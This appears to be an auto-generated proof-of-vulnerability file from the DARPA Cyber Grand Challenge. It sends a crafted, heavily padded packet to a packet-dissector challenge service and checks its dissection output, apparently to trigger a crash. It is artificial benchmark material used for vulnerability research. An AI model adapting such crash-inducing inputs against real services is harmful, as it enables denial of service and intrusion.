#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x98\x37\xcd\x35"
         "\xbd\xbb\x58\xc5\x9c\x93\x7d\x1e\xcb\x01\x00\x00\x01\xca\xc0\x31"
         "\x63\x61\xa2\xfb\x01\x4d\x2b\xb8\x0f\xdb\xdc\x01\x74\xe1\x95\xab"
         "\x16\x3d\x4e\xde\x60\xac\x55\x78\xad\x18\x89\x96\xf6\xda\x36\x57"
         "\xba\xb4\x86\x7f\xc4\x86\x13\x14\x31\xe8\x1c\xcd\xd8\x83\xf0\x23"
         "\x15\x8b\xd1\x6a\x19\xa0\xe6\x77\x58\x78\xde\x67\xc1\x58\xeb\x2f"
         "\x51\x2d\xfa\x27\x73\x82\x6f\x48\x63\x9c\x06\xa7\x71\x77\xc5\xc6"
         "\xe1\x68\xfc\x81\xb6\xd9\x8e\xb8\x0c\xaf\x04\xa3\x11\xb5\x33\x35"
         "\x97\xab\xf4\x4c\x05\xe4\x4f\xa7\x75\x72\x05\x00\xd2\x7e\xa2\x03"
         "\xd0\xf9\x93\x2e\xde\x20\xac\x31\xe9\x05\xa2\x68\x8f\x87\x87\x63"
         "\x73\x04\x78\xcb\x83\x42\xb5\x66\x74\x5f\x59\x77\xd1\x0d\x99\x29"
         "\x00\xc3\x69\x36\xe2\x32\x4f\x5e\x15\x45\xb6\x6d\x1f\xb8\x1d\xc6"
         "\x6b\x08\x89\xfe\x6e\x86\x7f\xe9\x61\x58\x30\x69\xf4\xdb\x49\x79"
         "\x95\x52\x2e\x53\x08\x5c\xcb\xec\x9a\x58\xea\xe8\x31\x5a\xe5\x45"
         "\xcf\xf2\xbe\x7b\x2f\xea\x53\xf4\x78\x1f\x2d\xb6\x2f\x1f\x95\x8e"
         "\x76\x83\x12\xa0\x1c\xa2\x4f\x08\x0f\x49\xf8\xa4\x9d\xb9\x4a\x87"
         "\x82\x63\x33\x85\x37\x52\xd6\x71\xe3\x6a\x08\x32\x2e\x6f\x74\xb0"
         "\xff\x0b\x81\x73\x51\xa5\x9b\xcf\x72\x48\xbc\x5f\x3b\x68\x93\x3d"
         "\xe7\x38\xaf\x3c\x4c\x6f\x23\x6e\xfb\x60\xb3\x71\x93\x45\xe4\xae"
         "\xd5\x61\xda\x3e\x7e\x05\x00\x05\x00\x71\x5f\x9f\x56\x05\x00\x19"
         "\x57\x95\x44\x25\x3e\xeb\xe7\x4a\xb9\x06\xa5\xac\xca\x4d\x1b\xca"
         "\x90\xd8\x6b\xde\x6b\xb9\x68\x71\xa8\x69\xe1\x06\xfc\x14\xa2\xf7"
         "\xae\x4c\x31\xf3\x46\xaa\x1b\x83\x20\x72\x9b\xa9\xa2\x40\x76\xd3"
         "\x21\x9e\x3c\x9d\x2e\xb7\xf4\xed\xaa\xc4\x95\x2a\xdc\x36\x52\x68"
         "\x01\xe2\x04\x37\x4b\xbd\xe5\x37\xe3\x18\xc0\xa4\xd8\x2b\xc7\x75"
         "\x03\x0f\xc7\xe9\xd5\xc2\xc7\x07\x9d\x80\x31\x97\x72\xfd\x27\x6a"
         "\x27\xd5\xe5\x20\x4d\x95\x48\x8b\x68\x26\x46\x2e\xb6\xa2\x9b\x60"
         "\x3e\xce\x36\x46\x7e\x91\x16\x8b\x54\x89\x0c\x29\xac\xec\xca\x69"
         "\x8d\x7b\x9a\xc9\x8f\xfe\x06\x1d\x09\x98\xf7\xc9\xa0\x50\xf3\xb8"
         "\xb7\x02\xe5\xda\x9c\x68\xd5\xc9\xd6\xc6\x19\xac\x39\x44\xfe\xf9"
         "\xdd\xa6\x1b\x2e\xf6\x95\x89\x63\x91\x07\x7a\xab\x98\x0e\x32\x54"
         "\xed\x84\x64\xfd\x06\x23\xa7\x29\xe1\x9f\xcd\x06\x60\xf3\xaf\x53"
         "\x10\x6c\xd2\x71\x38\x18\x00\x89\xda\x1e\xfd\xb1\x81\x23\xcd\x07"
         "\xb7\xc3\xde\x8d\x70\x8a\x06\x87\x08\xbe\x1c\x81\x44\x0b\xab\x99"
         "\x8b\xee\xe7\x3d\x69\x9a\xbc\x8f\x34\x17\xd0\x2b\xab\x2f\x4c\x6a"
         "\xa8\x30\x7c\xcb\xa7\x64\x26\x29\xaf\x18\x18\xcc\x38\x14\x07\x43"
         "\xbe\xfe\xac\xd3\x37\x6c\x5c\xc3\xf4\xeb\x60\xe1\x09\x34\x37\x24"
         "\xea\x0e\xff\x2c\x0c\x54\xc0\xc1\x5a\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===heterophyllychlorochromates
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x68\x65\x74\x65\x72\x6f\x70\x68\x79\x6c\x6c"
         "\x79\x63\x68\x6c\x6f\x72\x6f\x63\x68\x72\x6f\x6d\x61\x74\x65\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
